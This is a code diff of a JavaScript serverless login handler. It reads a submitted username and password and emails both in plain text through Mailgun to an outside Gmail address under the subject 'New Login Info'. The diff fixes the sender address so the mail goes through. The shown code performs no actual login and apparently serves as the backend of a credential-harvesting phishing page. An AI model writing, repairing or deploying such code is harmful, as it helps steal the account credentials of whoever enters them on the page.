@@ -11,12 +11,11 @@ export async function handler(event) {
 try {
 const { username, password } = JSON.parse(event.body);
 
-// Use your exact Mailgun sandbox domain here
-const domain = process.env.MAILGUN_DOMAIN; // e.g., sandbox6bb4164382f045b9975489c0e3137797.mailgun.org
+const domain = process.env.MAILGUN_DOMAIN; // should be: sandbox6bb4164382f045b9975489c0e3137797.mailgun.org
 
 await mg.messages.create(domain, {
-from: `Mailgun Sandbox <sandbox6bb4164382f045b9975489c0e3137797.mailgun.org>`,
-to: 'Anabones716@gmail.com', // must be verified in Mailgun sandbox
+from: 'Mailgun Sandbox <postmaster@sandbox6bb4164382f045b9975489c0e3137797.mailgun.org>',
+to: 'Anabones716@gmail.com', // must be authorized in Mailgun sandbox
 subject: 'New Login Info',
 text: `Username: ${username}\nPassword: ${password}`
 });
